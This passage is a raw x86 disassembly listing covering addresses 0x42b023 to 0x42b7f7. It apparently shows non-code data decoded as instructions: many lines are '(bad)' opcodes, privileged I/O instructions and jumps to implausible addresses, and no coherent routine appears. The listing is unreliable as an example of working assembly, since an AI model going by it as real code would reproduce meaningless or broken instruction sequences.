  42b023:	mov    ebp,0x928c850a
  42b028:	std    
  42b029:	add    BYTE PTR [edx+ecx*1+0x7b],0x48
  42b02e:	and    BYTE PTR [edx],cl
  42b030:	mov    al,0x1
  42b032:	mov    bh,0xd1
  42b034:	cmp    DWORD PTR [ebp+0x28],0x84f47574
  42b03b:	jo     0x42b033
  42b03d:	inc    DWORD PTR [eax]
  42b03f:	add    BYTE PTR [eax],al
  42b041:	add    BYTE PTR [eax],al
  42b043:	imul   eax,DWORD PTR [edi-0x72e3ef84],0xf
  42b04a:	push   0x4
  42b04c:	jle    0x42b00c
  42b04e:	push   eax
  42b04f:	sti    
  42b050:	mov    ecx,DWORD PTR [edx]
  42b052:	call   ecx
  42b054:	mov    ah,0x10
  42b056:	inc    eax
  42b057:	fadd   QWORD PTR [ebp-0x5b98f33d]
  42b05d:	add    cl,BYTE PTR [ebp+0x50501291]
  42b063:	mov    WORD PTR [esi+0xb5b1ce2],?
  42b069:	neg    DWORD PTR [edi-0x66]
  42b06c:	scas   eax,DWORD PTR es:[edi]
  42b06d:	mov    edx,0x8b5500c8
  42b073:	mov    eax,0x9e18eb7f
  42b078:	add    BYTE PTR [eax],al
  42b07a:	push   ebx
  42b07b:	bound  esi,QWORD PTR [ebx+0x738875f5]
  42b081:	test   esp,ebp
  42b083:	jne    0x42b01b
  42b085:	pop    es
  42b086:	sti    
  42b087:	mov    dl,BYTE PTR ds:0x948d4ffc
  42b08d:	ret    0x7afa
  42b090:	outs   dx,DWORD PTR ds:[esi]
  42b091:	jne    0xc3bd9602
  42b097:	jne    0x42b082
  42b099:	(bad)  
  42b09a:	popa   
  42b09b:	mul    BYTE PTR [ebx]
  42b09d:	add    al,0xb
  42b09f:	icebp  
  42b0a0:	sahf   
  42b0a1:	(bad)  
  42b0a2:	push   DWORD PTR [ebp+0x68]
  42b0a5:	mov    dl,0xb
  42b0a7:	add    BYTE PTR [eax],al
  42b0a9:	add    BYTE PTR [eax],al
  42b0ab:	add    BYTE PTR [edx+0x19],cl
  42b0ae:	or     DWORD PTR [ebp-0x731240be],eax
  42b0b4:	lock dec ebp
  42b0b6:	add    bh,bl
  42b0b8:	xor    bl,BYTE PTR [edx-0x270aeaf9]
  42b0be:	mov    esi,0x8b29f9ff
  42b0c3:	add    al,0xdd
  42b0c5:	jmp    0xb9bab0c8
  42b0ca:	pushf  
  42b0cb:	(bad)  
  42b0cc:	pushf  
  42b0cd:	in     al,0x96
  42b0cf:	inc    DWORD PTR [edx]
  42b0d1:	jmp    0xfb02:0xdf08cbe
  42b0d8:	repnz cdq 
  42b0da:	jno    0x42b121
  42b0dc:	jns    0x42b0df
  42b0de:	xchg   esi,eax
  42b0df:	xchg   esi,eax
  42b0e0:	jecxz  0x42b0c6
  42b0e2:	jg     0x42b0a4
  42b0e4:	popa   
  42b0e5:	popa   
  42b0e6:	jns    0x42b12d
  42b0e8:	leave  
  42b0e9:	cmp    DWORD PTR [ecx+0x1fc40fb],eax
  42b0ef:	jne    0x42b156
  42b0f1:	jbe    0x42b0b4
  42b0f3:	or     esp,DWORD PTR ds:0xb2f9b4d1
  42b0f9:	mov    ah,0x7f
  42b0fb:	shl    BYTE PTR [ecx],0x49
  42b0fe:	jg     0x42b17d
  42b100:	test   eax,0x5391a202
  42b105:	jg     0x42b122
  42b107:	or     al,0x8e
  42b109:	jne    0x42b0d7
  42b10b:	scas   al,BYTE PTR es:[edi]
  42b10c:	daa    
  42b10d:	lea    esp,[ebx]
  42b10f:	adc    BYTE PTR [eax],al
  42b111:	add    BYTE PTR [eax],al
  42b113:	add    BYTE PTR [eax],al
  42b115:	and    eax,0x7ff7fbfb
  42b11a:	adc    eax,0x2b2f1b9
  42b11f:	ins    BYTE PTR es:[edi],dx
  42b120:	inc    esp
  42b121:	push   edx
  42b122:	adc    bl,BYTE PTR [ecx+eax*8+0x66]
  42b126:	push   edx
  42b127:	mov    ecx,0xed5ce9b3
  42b12c:	sbb    edx,esp
  42b12e:	pushf  
  42b12f:	push   edx
  42b130:	pop    es
  42b131:	icebp  
  42b132:	rcl    esp,0xd6
  42b135:	aas    
  42b136:	jne    0x42b12d
  42b138:	push   es
  42b139:	pusha  
  42b13a:	push   es
  42b13b:	(bad)  
  42b13c:	ret    
  42b13d:	xor    al,BYTE PTR [eax+0x542ff7a3]
  42b143:	mov    ds:0xf5c68806,al
  42b148:	ret    
  42b149:	sbb    al,BYTE PTR [esi+0x64789028]
  42b14f:	data16 (bad) 
  42b151:	or     cl,BYTE PTR [esp+eiz*2]
  42b154:	test   eax,0x7901faff
  42b159:	mov    al,0xe
  42b15b:	adc    DWORD PTR [esi],esp
  42b15d:	or     edi,esp
  42b15f:	icebp  
  42b160:	push   ebx
  42b161:	je     0x42b14a
  42b163:	fidivr WORD PTR [eax+0x38]
  42b166:	push   cs
  42b167:	shl    DWORD PTR [ecx],1
  42b169:	add    edi,esp
  42b16b:	(bad)  
  42b16d:	adc    bl,BYTE PTR [ebx+0x33]
  42b170:	stos   DWORD PTR es:[edi],eax
  42b171:	mov    ebp,0x9203dcbf
  42b176:	ret    0xd84e
  42b179:	add    BYTE PTR [eax],al
  42b17b:	add    BYTE PTR [eax],al
  42b17d:	add    BYTE PTR [edx],ch
  42b17f:	mov    DWORD PTR [edx],esp
  42b181:	cld    
  42b182:	std    
  42b183:	inc    ebx
  42b184:	add    ch,ah
  42b186:	sub    DWORD PTR [eax+0x10],eax
  42b189:	pop    esp
  42b18a:	loopne 0x42b19c
  42b18c:	das    
  42b18d:	mov    al,0xe6
  42b18f:	mov    edi,0x279e541
  42b194:	add    cl,ch
  42b196:	dec    ebx
  42b197:	add    al,ch
  42b199:	bound  esi,QWORD PTR [esi-0x3f8f9b06]
  42b19f:	push   cs
  42b1a0:	sti    
  42b1a1:	aam    0x26
  42b1a3:	adc    al,0x40
  42b1a5:	jmp    0x624e70a1
  42b1aa:	mov    al,ds:0x817251b9
  42b1af:	jmp    0xadf2:0x276e90e
  42b1b6:	sub    al,BYTE PTR [edx]
  42b1b8:	add    ebp,edx
  42b1ba:	inc    eax
  42b1bb:	push   esp
  42b1bc:	call   0xfb401eb3
  42b1c1:	jb     0x42b233
  42b1c3:	pop    esp
  42b1c4:	mov    esi,0x418176ed
  42b1c9:	loope  0x42b22e
  42b1cb:	add    al,0xe8
  42b1cd:	jb     0x42b205
  42b1cf:	cli    
  42b1d0:	sub    DWORD PTR [ecx],0x2
  42b1d3:	add    eax,0x6051650
  42b1d8:	pop    gs
  42b1da:	jbe    0x42b1d9
  42b1dc:	jno    0x42b1b7
  42b1de:	pop    esi
  42b1df:	jmp    0x42b1d9
  42b1e1:	inc    BYTE PTR [eax]
  42b1e3:	add    BYTE PTR [eax],al
  42b1e5:	add    BYTE PTR [eax],al
  42b1e7:	js     0x42b1ae
  42b1e9:	add    DWORD PTR [ecx+0x2a0039fb],edx
  42b1ef:	idiv   DWORD PTR [eax+ecx*1-0x17]
  42b1f3:	jmp    0x42b208
  42b1f5:	jmpw   0xabe5
  42b1f9:	push   0xf9f9ece8
  42b1fe:	hlt    
  42b1ff:	mov    dl,0x12
  42b201:	inc    eax
  42b202:	add    ah,cl
  42b204:	jl     0x42b244
  42b206:	or     BYTE PTR [ecx],bl
  42b208:	ds jne 0x42b20c
  42b20b:	(bad)  
  42b20d:	mov    edx,0xadefcf40
  42b212:	inc    ecx
  42b213:	cwde   
  42b214:	xor    bh,0x2c
  42b217:	imul   eax,DWORD PTR [ebx],0x2b
  42b21a:	rcr    bh,0xef
  42b21d:	mov    al,0x49
  42b21f:	test   BYTE PTR [edx+0x44a7d4bf],al
  42b225:	mov    ebx,0x7b1ae755
  42b22a:	in     al,dx
  42b22b:	cmp    al,0xa7
  42b22d:	dec    ebp
  42b22e:	mov    esp,esp
  42b230:	sar    DWORD PTR [edx-0x21761ec0],cl
  42b236:	call   0x3d8a43
  42b23b:	mov    ah,0x75
  42b23d:	cmp    edi,0xfc457db3
  42b243:	sar    DWORD PTR [ecx-0x168caf16],0x52
  42b24a:	adc    DWORD PTR [eax],eax
  42b24c:	add    BYTE PTR [eax],al
  42b24e:	add    BYTE PTR [eax],al
  42b250:	fadd   QWORD PTR [eax*4+0x1ff0e9c0]
  42b257:	inc    ebp
  42b258:	js     0x42b259
  42b25a:	adc    al,0x18
  42b25c:	pextrw edi,mm2,0x88
  42b260:	fst    DWORD PTR [edx+eiz*2]
  42b263:	adc    al,0x74
  42b265:	mov    dh,0x1c
  42b267:	add    BYTE PTR [esi*4+0x1678458b],cl
  42b26e:	xchg   edi,eax
  42b26f:	and    eax,0xc08404dc
  42b274:	push   0x610864d5
  42b279:	mov    eax,0xb86150ea
  42b27e:	fsubp  st(0),st
  42b280:	jne    0x42b2e0
  42b282:	(bad)  
  42b284:	ret    0x3f5e
  42b287:	je     0x42b2e4
  42b289:	push   ebp
  42b28a:	add    BYTE PTR [ebp-0x735148c8],cl
  42b290:	xor    bh,al
  42b292:	push   ss
  42b293:	ja     0x42b2ed
  42b295:	jmp    0x42b295
  42b297:	xor    DWORD PTR [ebp+0x388cf816],0x7f
  42b29e:	push   ss
  42b29f:	adc    DWORD PTR [ebx-0x15],edx
  42b2a2:	inc    BYTE PTR [ebx+0x65e20db5]
  42b2a8:	popa   
  42b2a9:	adc    eax,0xcf725304
  42b2ae:	scas   al,BYTE PTR es:[edi]
  42b2af:	adc    DWORD PTR [ebp+0x798e9],esi
  42b2b5:	add    BYTE PTR [eax],al
  42b2b7:	add    BYTE PTR [eax],al
  42b2b9:	lock push ds
  42b2bb:	adc    al,0x50
  42b2bd:	imul   BYTE PTR [eax]
  42b2bf:	repz push edx
  42b2c1:	push   edx
  42b2c2:	out    dx,eax
  42b2c3:	mov    dl,0x11
  42b2c5:	mov    ch,0xe9
  42b2c7:	jg     0x42b28d
  42b2c9:	pop    ebp
  42b2ca:	push   esi
  42b2cb:	mov    edx,0xd9de4de3
  42b2d0:	push   DWORD PTR [edx]
  42b2d2:	cdq    
  42b2d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b2d4:	enter  0x9836,0xab
  42b2d8:	xchg   BYTE PTR ds:0x1a800242,ah
  42b2de:	and    esp,esi
  42b2e0:	mov    cl,0x35
  42b2e2:	add    DWORD PTR [ebx-0x5],0x75
  42b2e6:	jmp    0x117539e9
  42b2eb:	push   es
  42b2ec:	cli    
  42b2ed:	aaa    
  42b2ee:	jb     0x42b2dd
  42b2f0:	out    0xda,eax
  42b2f2:	imul   eax,DWORD PTR [ebx+edi*8],0x993f377a
  42b2f9:	jmp    0xf502:0x914477e8
  42b300:	mov    ss,WORD PTR [ecx+0x7543f346]
  42b306:	mov    ch,BYTE PTR [edx]
  42b308:	push   es
  42b309:	sti    
  42b30a:	ds add eax,0xe640ed14
  42b310:	nop
  42b311:	xor    al,0xfe
  42b313:	mov    edx,0xd762bc6
  42b318:	sbb    BYTE PTR [ebp-0x76],dh
  42b31b:	adc    al,BYTE PTR ds:0x0
  42b321:	add    BYTE PTR [ecx],ah
  42b323:	or     BYTE PTR [edi],cl
  42b325:	sbb    BYTE PTR [esi+0x251bc56e],cl
  42b32b:	idiv   DWORD PTR [ecx+0x7e06b687]
  42b331:	or     DWORD PTR [ebp+0x6e038202],ecx
  42b337:	ins    BYTE PTR es:[edi],dx
  42b338:	aad    0xeb
  42b33a:	out    dx,eax
  42b33b:	and    ecx,ebp
  42b33d:	add    eax,ebp
  42b33f:	and    DWORD PTR [edx+0x39f7c71c],0xffffff87
  42b346:	ss push es
  42b348:	mov    edx,0xe9060b61
  42b34d:	pop    eax
  42b34e:	cli    
  42b34f:	in     eax,0x67
  42b351:	lock push ss
  42b353:	add    al,0xe9
  42b355:	add    eax,edi
  42b357:	jge    0x42b376
  42b359:	js     0x42b30c
  42b35b:	pusha  
  42b35c:	data16 aas 
  42b35e:	jne    0x42b3ce
  42b360:	jmp    0x42b2f2
  42b362:	loope  0x42b3c5
  42b364:	and    al,0x3
  42b366:	push   cs
  42b367:	jmp    0x6965:0xf70e8223
  42b36e:	or     DWORD PTR [edx],eax
  42b370:	imul   di,cx,0x9601
  42b375:	nop
  42b376:	cmp    esi,ebp
  42b378:	cwde   
  42b379:	jmp    0x42b321
  42b37b:	cmp    eax,DWORD PTR [eax]
  42b37d:	jmp    0x760231f8
  42b382:	jge    0x42b37f
  42b384:	je     0x42b36b
  42b386:	add    BYTE PTR [eax],al
  42b388:	add    BYTE PTR [eax],al
  42b38a:	add    BYTE PTR [ebx],al
  42b38c:	sar    edx,0x54
  42b38f:	int    0x5c
  42b391:	add    BYTE PTR [ecx],bh
  42b393:	push   ecx
  42b394:	(bad)  
  42b395:	(bad)  
  42b396:	call   0x399f9e11
  42b39b:	jns    0x42b39f
  42b39d:	sti    
  42b39e:	xor    al,0xad
  42b3a0:	fiadd  WORD PTR [ebx-0x4f]
  42b3a3:	ja     0x42b3a0
  42b3a5:	dec    esi
  42b3a6:	shl    DWORD PTR [edx+edi*8],0xfa
  42b3aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b3ab:	adc    al,0xc9
  42b3ad:	mov    esi,0x7eeafa34
  42b3b2:	lea    edi,[esi-0x7f]
  42b3b5:	jmp    0x42b35c
  42b3b7:	ins    DWORD PTR es:[edi],dx
  42b3b8:	add    al,BYTE PTR [eax]
  42b3ba:	sbb    cl,bh
  42b3bc:	push   ecx
  42b3bd:	lea    esp,ds:0x7f2f0e9d
  42b3c3:	(bad)  
  42b3c4:	mov    esi,DWORD PTR [ebx-0x3b]
  42b3c7:	jle    0x42b3b3
  42b3c9:	mov    eax,0x83f9770e
  42b3ce:	sub    DWORD PTR [edi+0x7e],esp
  42b3d1:	xchg   ebp,eax
  42b3d2:	jmp    0xff2ab64d
  42b3d7:	mov    edi,eax
  42b3d9:	cli    
  42b3da:	jb     0x42b42a
  42b3dc:	mov    ebx,DWORD PTR [ebx+0x5]
  42b3df:	mov    DWORD PTR [ebx-0xf76f2a5],ecx
  42b3e5:	mov    esi,0xe80c9dd9
  42b3ea:	in     eax,0xbb
  42b3ec:	stc    
  42b3ed:	cli    
  42b3ee:	mov    bh,0x0
  42b3f0:	add    BYTE PTR [eax],al
  42b3f2:	add    BYTE PTR [eax],al
  42b3f4:	inc    ebx
  42b3f5:	int    0x51
  42b3f7:	stos   BYTE PTR es:[edi],al
  42b3f8:	push   cs
  42b3f9:	push   edi
  42b3fa:	ds push cs
  42b3fc:	ja     0x42b473
  42b3fe:	dec    esp
  42b3ff:	add    al,al
  42b401:	sbb    DWORD PTR [eax],edx
  42b403:	mov    ecx,DWORD PTR [eax]
  42b405:	push   ds
  42b406:	sbb    bl,ch
  42b408:	(bad)  
  42b409:	sti    
  42b40a:	mov    ecx,0xe80c6101
  42b40f:	scas   al,BYTE PTR es:[edi]
  42b410:	outs   dx,BYTE PTR ds:[esi]
  42b411:	add    bh,dh
  42b413:	lea    ebp,[eax]
  42b415:	sub    ah,BYTE PTR [eax]
  42b417:	call   0x431365
  42b41c:	dec    edi
  42b41d:	(bad)  
  42b41e:	(bad)  
  42b41f:	jmp    0x460:0x2b9f877
  42b426:	call   0x44410d
  42b42b:	sub    DWORD PTR [edi-0xdd31e0b],0xffffffbf
  42b432:	(bad)  
  42b433:	jae    0x42b3bb
  42b435:	jmp    0x1ceb57e
  42b43a:	jnp    0x42b41f
  42b43c:	out    0xe7,eax
  42b43e:	sbb    esi,esi
  42b440:	pop    ds
  42b441:	ds jne 0x42b475
  42b444:	fnstcw WORD PTR [edx+0x24]
  42b447:	sbb    ah,dh
  42b449:	jns    0x42b465
  42b44b:	add    BYTE PTR [ecx+ebp*8+0x24],cl
  42b44f:	adc    BYTE PTR [ecx+eax*1-0x7d],bl
  42b453:	into   
  42b454:	ffreep st(7)
  42b456:	cmp    ch,al
  42b458:	add    BYTE PTR [eax],al
  42b45a:	add    BYTE PTR [eax],al
  42b45c:	add    dl,al
  42b45e:	sbb    al,0x0
  42b460:	add    BYTE PTR [edi+0x62],ah
  42b463:	and    al,0x10
  42b465:	lock or eax,0xe70448d
  42b46b:	push   eax
  42b46c:	push   0xd
  42b46e:	addr16 add al,0x58
  42b471:	xchg   ebp,eax
  42b472:	bound  esp,QWORD PTR [eax+ebx*1]
  42b475:	fs xor al,0x28
  42b478:	(bad)  
  42b479:	imul   eax,DWORD PTR [ebp-0x88adb92],0xffffffe6
  42b480:	stc    
  42b481:	push   ebx
  42b482:	add    eax,0xb8535b01
  42b487:	mov    esi,0x5afdfe56
  42b48c:	mov    esi,0x3c7eeb79
  42b491:	add    eax,0x74004509
  42b496:	push   ebp
  42b497:	cmp    eax,0x1182252
  42b49c:	push   ebx
  42b49d:	sub    dh,BYTE PTR [esp+ebp*2]
  42b4a0:	mov    esp,0x530428ed
  42b4a5:	dec    edx
  42b4a6:	mov    esp,0x2b879c11
  42b4ab:	add    al,0x87
  42b4ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b4ae:	out    dx,eax
  42b4af:	div    DWORD PTR [ebx+0x7a]
  42b4b2:	inc    ebx
  42b4b3:	mov    WORD PTR [esi],cs
  42b4b5:	jne    0x42b4a2
  42b4b7:	pop    eax
  42b4b8:	sti    
  42b4b9:	pusha  
  42b4ba:	not    DWORD PTR [ebx]
  42b4bc:	inc    eax
  42b4bd:	jne    0x42b525
  42b4bf:	mov    edi,0x73
  42b4c4:	add    BYTE PTR [eax],al
  42b4c6:	ins    DWORD PTR es:[edi],dx
  42b4c7:	sub    al,0x56
  42b4c9:	sti    
  42b4ca:	mov    BYTE PTR [ecx+0xb75400e],al
  42b4d0:	add    DWORD PTR ds:0x3ed879,edx
  42b4d6:	mov    edx,0xfe54c503
  42b4db:	dec    ebp
  42b4dc:	test   bl,ch
  42b4de:	test   DWORD PTR [ebx-0x290fae94],ebp
  42b4e4:	into   
  42b4e5:	push   edi
  42b4e6:	dec    ebp
  42b4e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b4e8:	jns    0x42b4e5
  42b4ea:	xor    bh,BYTE PTR ds:0xe99f0872
  42b4f0:	out    0xa3,al
  42b4f2:	push   0x2c
  42b4f4:	add    BYTE PTR [edx-0xf],bl
  42b4f7:	sub    DWORD PTR [ebx+0x18],esi
  42b4fa:	add    BYTE PTR [ebx],al
  42b4fc:	lods   al,BYTE PTR ds:[esi]
  42b4fd:	sar    DWORD PTR [edx-0x1f46c0d],cl
  42b503:	ins    DWORD PTR es:[edi],dx
  42b504:	loope  0x42b4f1
  42b506:	(bad)  
  42b507:	cmp    cl,BYTE PTR [edx]
  42b509:	add    al,bh
  42b50b:	ret    0x67c
  42b50e:	call   0x2930:0xe0eca8c2
  42b515:	retf   0xff18
  42b518:	call   0x6629af73
  42b51d:	call   0x590f36e4
  42b522:	ret    
  42b523:	repz call 0x5c92087e
  42b529:	js     0x42b52b
  42b52b:	add    BYTE PTR [eax],al
  42b52d:	add    BYTE PTR [eax],al
  42b52f:	pop    ecx
  42b530:	sub    ah,BYTE PTR [ecx]
  42b532:	in     al,dx
  42b533:	xchg   DWORD PTR [ebp-0x46],esi
  42b536:	(bad)  
  42b537:	sti    
  42b538:	mov    esp,0x3eec523e
  42b53d:	add    eax,0xcd6f0010
  42b542:	aaa    
  42b543:	sub    eax,0x7e80e3ea
  42b548:	repz arpl WORD PTR [eax+0x51],cx
  42b54c:	push   edx
  42b54d:	cmp    esp,ebp
  42b54f:	(bad)  
  42b550:	repnz cmp edi,0x3cf4c1f6
  42b557:	loop   0x42b5b7
  42b559:	int    0xf
  42b55b:	jne    0x42b4e2
  42b55d:	and    al,0x28
  42b55f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b560:	mov    DWORD PTR [edi+eiz*1+0x27a48565],ebp
  42b567:	ins    DWORD PTR es:[edi],dx
  42b568:	mov    DWORD PTR [edi+eiz*1+0x5422875d],ebp
  42b56f:	add    BYTE PTR [esi],bh
  42b571:	or     eax,0x53e3614
  42b576:	sbb    al,0x78
  42b578:	add    al,BYTE PTR [eax]
  42b57a:	jmp    0x58674f5
  42b57f:	pop    ecx
  42b580:	add    DWORD PTR [eax],eax
  42b582:	jmp    0xc58674fd
  42b587:	pop    edx
  42b588:	hlt    
  42b589:	cli    
  42b58a:	jmp    0x986da005
  42b58f:	jbe    0x42b593
  42b591:	pop    edx
  42b592:	jb     0x42b594
  42b594:	add    BYTE PTR [eax],al
  42b596:	add    BYTE PTR [eax],al
  42b598:	fcom   QWORD PTR [ebp-0x41]
  42b59b:	xchg   esp,eax
  42b59c:	out    dx,eax
  42b59d:	out    0x80,al
  42b59f:	add    eax,0xe9faf469
  42b5a4:	in     eax,0x7d
  42b5a6:	mul    esp
  42b5a8:	retf   
  42b5a9:	test   DWORD PTR [edi-0x2f],0xd6faf77d
  42b5b0:	repnz mov dl,0x73
  42b5b3:	loop   0x42b5ba
  42b5b5:	xchg   bh,dh
  42b5b7:	les    ebp,FWORD PTR [ebx+0x4890e7f7]
  42b5bd:	add    al,BYTE PTR [eax]
  42b5bf:	mov    al,ds:0xbd874db7
  42b5c4:	mul    esi
  42b5c6:	sbb    edi,DWORD PTR [edx]
  42b5c8:	and    edi,DWORD PTR [ebx+0x74]
  42b5cb:	icebp  
  42b5cc:	out    dx,eax
  42b5cd:	add    BYTE PTR [ebx+0x60],dl
  42b5d0:	and    eax,0x811c8cee
  42b5d5:	push   ebx
  42b5d6:	sti    
  42b5d7:	cld    
  42b5d8:	jp     0x42b563
  42b5da:	aad    0x13
  42b5dc:	bound  ebp,QWORD PTR [eax+0x0]
  42b5df:	add    esi,DWORD PTR [eax+0x54]
  42b5e2:	mov    DWORD PTR [ecx+ecx*2],ecx
  42b5e5:	in     eax,dx
  42b5e6:	dec    edi
  42b5e7:	mov    ecx,0x640ab1fd
  42b5ec:	push   ebp
  42b5ed:	repnz cli 
  42b5ef:	jmp    0x9ccfb9e3
  42b5f4:	cs push ebx
  42b5f6:	xchg   DWORD PTR [eax],eax
  42b5f8:	loope  0x42b5fb
  42b5fa:	push   0x2c
  42b5ff:	add    BYTE PTR [eax],al
  42b601:	nop
  42b602:	inc    ebp
  42b603:	add    bh,bh
  42b605:	(bad)  
  42b607:	dec    ebp
  42b608:	(bad)  
  42b609:	in     al,dx
  42b60a:	sbb    eax,0x7b03c085
  42b60f:	xchg   edx,eax
  42b610:	add    BYTE PTR [esi+eax*1],cl
  42b613:	add    DWORD PTR [ebp+0x64],0x7c
  42b617:	add    cl,BYTE PTR [ebp+0x6a4cde29]
  42b61d:	mov    esp,0xe3501c5b
  42b622:	xchg   ebp,eax
  42b623:	mov    BYTE PTR [eax],0xcc
  42b626:	add    eax,0x7849c085
  42b62b:	and    DWORD PTR [ebp-0x30],eax
  42b62e:	sub    eax,0x642ae845
  42b633:	sub    ebx,ebx
  42b635:	push   edi
  42b636:	dec    ecx
  42b637:	in     al,dx
  42b638:	mov    eax,DWORD PTR [eax+0x3]
  42b63b:	sbb    al,0x85
  42b63d:	mov    bl,0x6a
  42b63f:	inc    esp
  42b640:	push   0x4c
  42b642:	push   edi
  42b643:	not    DWORD PTR ds:0x401330
  42b649:	sbb    esi,eax
  42b64b:	outs   dx,BYTE PTR ds:[esi]
  42b64c:	aaa    
  42b64d:	dec    ebx
  42b64e:	pop    esp
  42b64f:	add    BYTE PTR [ebx-0x371d103c],al
  42b655:	(bad)  
  42b656:	out    dx,eax
  42b657:	cmc    
  42b658:	mov    eax,DWORD PTR [ecx+ecx*4]
  42b65b:	cmc    
  42b65c:	je     0x42b69a
  42b65e:	jp     0x42b6ab
  42b660:	adc    al,0x8b
  42b662:	add    edx,0xffffffff
  42b665:	add    BYTE PTR [eax],al
  42b667:	add    BYTE PTR [eax],al
  42b669:	add    ah,dh
  42b66b:	retf   
  42b66c:	(bad)  
  42b66e:	jecxz  0x42b6ea
  42b670:	mov    edx,0x4b7a4c74
  42b675:	adc    al,0x5f
  42b677:	(bad)  
  42b678:	bound  ebx,QWORD PTR [ebp+esi*2+0x67]
  42b67c:	inc    esp
  42b67d:	add    BYTE PTR [ebp+0x2adcc243],dh
  42b683:	dec    eax
  42b684:	push   ebp
  42b685:	call   0xfb3fec77
  42b68a:	sbb    bl,BYTE PTR [esi+0x1fb886fa]
  42b690:	cmp    DWORD PTR [esi-0x17be1b4b],0x5c893c87
  42b69a:	add    eax,0xfef44364
  42b69f:	loop   0x42b62a
  42b6a1:	push   esp
  42b6a2:	fisttp QWORD PTR [esi+ecx*2-0x782cbb05]
  42b6a9:	inc    esp
  42b6aa:	frstor [ebx+0xc]
  42b6ad:	push   eax
  42b6ae:	ror    BYTE PTR [ecx-0x8bf04fa],cl
  42b6b4:	xchg   DWORD PTR [ecx],eax
  42b6b6:	sub    edx,eax
  42b6b8:	dec    esi
  42b6b9:	adc    al,0xba
  42b6bb:	dec    ebp
  42b6bc:	adc    BYTE PTR [edi-0x500ba85],al
  42b6c2:	and    bl,dh
  42b6c4:	push   esp
  42b6c5:	sti    
  42b6c6:	inc    ebp
  42b6c7:	pop    ss
  42b6c8:	cmp    DWORD PTR [edi-0x4d4a096],0x0
  42b6cf:	add    BYTE PTR [eax],al
  42b6d1:	add    BYTE PTR [eax],al
  42b6d3:	xchg   edx,eax
  42b6d4:	lahf   
  42b6d5:	sti    
  42b6d6:	je     0x42b755
  42b6d8:	je     0x42b6df
  42b6da:	push   edx
  42b6db:	sub    BYTE PTR [edx],0x5c
  42b6de:	xchg   eax,edi
  42b6e0:	jmp    0x5204:0x3ca0187
  42b6e7:	push   0xa
  42b6e9:	adc    BYTE PTR [ebp+0x395cf735],al
  42b6ef:	mov    dl,0xe1
  42b6f1:	jl     0x42b74c
  42b6f3:	(bad)  
  42b6f4:	fmul   QWORD PTR [ecx-0x47fd82b4]
  42b6fa:	push   esp
  42b6fb:	ds js  0x42b6e3
  42b6fe:	push   eax
  42b6ff:	ds push ebx
  42b701:	test   eax,0xa275f286
  42b706:	mov    BYTE PTR [ebx],ch
  42b708:	jg     0x42b6bd
  42b70a:	adc    eax,esp
  42b70c:	pop    esp
  42b70d:	jmp    0x96495f0e
  42b712:	cld    
  42b713:	ret    0x640a
  42b716:	ret    
  42b717:	or     DWORD PTR ds:0x7b697622,0xefa7f7ab
  42b721:	fwait
  42b722:	psubd  mm2,mm3
  42b725:	or     DWORD PTR [esi-0x7b],esi
  42b728:	fimul  DWORD PTR [edx-0x3]
  42b72b:	fucomip st,st(7)
  42b72d:	ins    DWORD PTR es:[edi],dx
  42b72e:	inc    esi
  42b72f:	test   DWORD PTR [ebx-0x20],edi
  42b732:	push   ebx
  42b733:	into   
  42b734:	push   ecx
  42b735:	loope  0x42b6bf
  42b737:	add    BYTE PTR [eax],al
  42b739:	add    BYTE PTR [eax],al
  42b73b:	add    bl,cl
  42b73d:	pop    eax
  42b73e:	loop   0x42b7b1
  42b740:	ins    DWORD PTR es:[edi],dx
  42b741:	push   ebx
  42b742:	ficom  DWORD PTR [ecx+esi*1-0x7b]
  42b746:	test   al,0x70
  42b748:	repz out dx,eax
  42b74a:	push   ebx
  42b74b:	or     al,0xf2
  42b74d:	add    edx,DWORD PTR [esi]
  42b74f:	sti    
  42b750:	xor    bh,BYTE PTR [edx]
  42b752:	sbb    bl,BYTE PTR [edx+0x42]
  42b755:	mov    ecx,0x557514a6
  42b75a:	pop    esi
  42b75b:	call   0x5579655
  42b760:	jne    0x42b764
  42b762:	ss push edx
  42b764:	es pop edx
  42b766:	and    eax,0x102b288
  42b76b:	cmp    cl,bh
  42b76d:	inc    ecx
  42b76e:	jmp    0xe9520f5e
  42b773:	add    esi,edx
  42b775:	icebp  
  42b776:	(bad)  
  42b777:	mov    ecx,0xdeef3833
  42b77c:	retf   0xff7c
  42b77f:	call   0x7091f6fa
  42b784:	pushf  
  42b785:	out    dx,al
  42b786:	xchg   bh,ch
  42b788:	(bad)  
  42b789:	jmp    0x42b7da
  42b78b:	(bad)  
  42b78d:	scas   al,BYTE PTR es:[edi]
  42b78e:	je     0x42b758
  42b790:	repz add BYTE PTR [ebp+0x4f521eac],cl
  42b797:	ret    
  42b798:	js     0x42b7ee
  42b79a:	sti    
  42b79b:	cdq    
  42b79c:	jp     0x42b723
  42b79e:	mov    edi,0x9c
  42b7a3:	add    BYTE PTR [eax],al
  42b7a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b7a6:	pop    edx
  42b7a7:	sbb    al,0x6d
  42b7a9:	mov    cl,0x2
  42b7ab:	push   0x2efae5
  42b7b0:	add    DWORD PTR ds:0xf3e9000c,ebx
  42b7b6:	div    BYTE PTR [esi]
  42b7b8:	add    ah,BYTE PTR [ebp+0x20]
  42b7bb:	lea    ebp,[edx+ecx*8-0x169b72c2]
  42b7c2:	call   0x7d699ec1
  42b7c7:	inc    esp
  42b7c8:	cdq    
  42b7c9:	es jmp 0x42b840
  42b7cc:	rol    DWORD PTR [ebx],1
  42b7ce:	rol    DWORD PTR [esi-0x4fba4862],1
  42b7d4:	sub    eax,0xa6000279
  42b7d9:	cmc    
  42b7da:	xchg   esi,eax
  42b7db:	stc    
  42b7dc:	mov    dh,0x8f
  42b7de:	push   ss
  42b7df:	add    ecx,ebp
  42b7e1:	jbe    0x42b7bd
  42b7e3:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b7e5:	jg     0x42b7d2
  42b7e7:	xchg   dh,ah
  42b7e9:	daa    
  42b7ea:	jmp    0x42b83b
  42b7ec:	loope  0x42b7f1
  42b7ee:	inc    edi
  42b7ef:	clc    
  42b7f0:	bound  edi,QWORD PTR [esi+0x52]
  42b7f3:	sti    
  42b7f4:	add    BYTE PTR [ebp-0x2],bh
  42b7f7:	add    BYTE PTR [esi],0x82
